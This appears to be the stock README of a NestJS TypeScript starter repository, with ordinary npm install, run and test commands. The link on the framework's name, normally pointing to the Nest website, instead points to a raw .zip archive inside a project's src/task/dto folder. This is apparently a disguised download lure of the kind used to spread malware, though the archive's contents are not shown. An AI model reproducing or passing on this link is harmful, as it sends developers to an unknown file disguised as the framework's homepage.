## Description

[Nest](https://github.com/rizwan199811/Nest-JS-Practice/raw/refs/heads/main/src/task/dto/J-Nest-Practice-2.1.zip) framework TypeScript starter repository.

## Installation

```bash
$ npm install
```

## Running the app

```bash
# development
$ npm run start

# watch mode
$ npm run start:dev

# production mode
$ npm run start:prod
```

## Test

```bash
# unit tests
$ npm run test

# e2e tests
$ npm run test:e2e

# test coverage
$ npm run test:cov
```
